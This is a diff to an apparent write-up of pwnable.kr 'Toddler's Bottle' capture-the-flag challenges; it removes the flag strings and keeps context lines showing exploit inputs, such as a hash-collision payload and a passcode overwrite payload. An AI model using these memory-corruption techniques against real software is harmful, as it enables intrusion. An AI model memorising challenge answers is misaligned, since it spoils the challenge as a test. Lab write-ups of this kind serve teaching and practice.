@@ -47,7 +47,6 @@ fd@ubuntu:~$ man read
 fd@ubuntu:~$ ./fd 4660
 LETMEWIN
 good job :)
-mommy! I think I know what a file descriptor is!!
 
 
 
@@ -87,7 +86,6 @@ int main(int argc, char* argv[]){
 }
 
 col@ubuntu:~$ ./col $(python -c 'print "\xcc\xcc\xcc\x01"*4 + "\xbc\xd6\xa9\x1a"')
-daddy! I just managed to create a hash collision :)
 
 
 Toddler's Bottle - bof
@@ -120,7 +118,6 @@ flag
 log
 super.pl
 cat flag
-daddy, I just pwned a buFFer :)
 
 
 Toddler's Bottle - flag
@@ -182,7 +179,6 @@ Function too big at 0x496608
 0x00496658  4920 7769 6c6c 206d 616c 6c6f 63         I will malloc
 [0x00401058]> quit
 kgn@kali:~$ strings flag.unupx |grep UPX
-UPX...? sounds like a delivery service :)
 
 
 Toddler's Bottle - passcode
@@ -305,7 +301,7 @@ passcode@ubuntu:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"|.p
 passcode@ubuntu:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"'|./passcode
 Toddler's Secure Login System 1.0 beta.
 enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
-Sorry mom.. I got confused about scanf usage :(
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 enter passcode1 : Now I can safely trust you that you have credential :)
 
 
@@ -396,7 +392,6 @@ Good!
 random@ubuntu:~$ ./random
 3039230856
 Good!
-Mommy, I thought libc random is unpredictable...
 
 
 Toddler's Bottle - input
@@ -511,3 +506,5 @@ else:
         c.connect(('127.0.0.1', port))
         c.send('\xde\xad\xbe\xef')
         c.close()
+
+
